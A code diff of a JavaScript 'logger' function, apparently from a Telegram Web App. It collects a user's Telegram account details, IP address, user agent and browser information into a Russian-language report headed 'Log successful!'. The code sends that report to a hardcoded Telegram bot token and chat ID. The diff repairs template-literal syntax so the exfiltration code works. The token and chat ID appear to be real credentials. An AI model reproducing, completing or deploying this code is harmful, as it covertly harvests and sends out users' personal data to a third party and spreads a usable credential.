@@ -38,7 +38,7 @@ async function sendDataToTelegram() {
     const browserInfo = getBrowserInfo();
     let tg = window.Telegram.WebApp;
 
-    const message = 
+    const message = `
 <b>✨ Лог успешен!</b>
 
 <b>🔍 Информация об аккаунте:</b>
@@ -49,7 +49,7 @@ async function sendDataToTelegram() {
 ├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
 └ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>
 
-<b>🖥️ Информация об устройстве:</b>
+<b>🖥 Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
 ├ UserAgent: <code>${userAgent}</code>
 ├ Хэш: <code>undefined</code>
@@ -62,10 +62,10 @@ async function sendDataToTelegram() {
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
-    ;
+    `;
 
     const token = '7159693608:AAH9PgIOO7AJja_tqq4g8IdGbGMPw-Q1Ajg';
-    const telegramBotURL = https://api.telegram.org/bot${token}/sendMessage;
+    const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
     const chatId = '-1002005164665';
 
     const formData = new FormData();
